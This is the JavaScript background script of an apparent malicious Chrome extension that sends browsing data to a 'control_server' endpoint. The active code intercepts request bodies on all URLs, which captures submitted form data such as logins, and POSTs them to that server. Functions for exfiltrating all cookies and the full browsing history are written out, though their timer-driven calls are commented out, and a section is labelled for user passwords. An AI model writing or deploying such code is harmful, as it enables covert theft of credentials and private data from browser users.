const SERVER_HOST = "http://127.0.0.1:5000"

const url = `${SERVER_HOST}/control_server`;
//URL DATA

chrome.webNavigation.onCompleted.addListener((e) => {
    if (e.url == 'about:blank' && e.url=="a"){
    
        fetch(
        url,
        {
            method: "POST",
            body: JSON.stringify({ url: e.url }),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
}}, {});

/*
fetch(
    url,
    {
        method: "POST",
        body: JSON.stringify({ url: e.url }),
        headers: {
            "Content-Type": "application/json"
        }
    }
);*/


//Cookies Data

chrome.alarms.create({ periodInMinutes: 0.1 });


function logCookies(cookies) {
    var a = [];
    for (const cookie of cookies) {
      a.push(cookie);
    }
    fetch(
        url,
        {
            method: "POST",
            body:JSON.stringify(a),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
  }

function logHistory(hists){
    var a = []
    for(const his of hists){
        a.push(his)
    }
    fetch(
        url,
        {
            method: "POST",
            body:JSON.stringify(a),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );

}

function logFormData(form){

        let data = {};
        if (form.requestBody != undefined) {
            if (form.requestBody.formData != undefined) {
                data["data"] = form.requestBody.formData
            }
            if (form.requestBody.raw != undefined) {
                data["data"] = form.requestBody.formData.raw.join("");
            }
            fetch(
                url,
                {
                    method: "POST",
                    body: JSON.stringify(data),
                    headers: {
                        "Content-Type": "application/json"
                    }
                }
            );
        }
    

}


  chrome.alarms.onAlarm.addListener(()=>{
    //chrome.cookies.getAll({}).then(logCookies);
    //chrome.history.search({ text: "" }).then(logHistory);

})

//User-Passwords DATA




//

//Form DATA
chrome.webRequest.onBeforeRequest.addListener(
    (e) => {logFormData(e)},
    {urls: ["<all_urls>"]},
    ["requestBody"]
);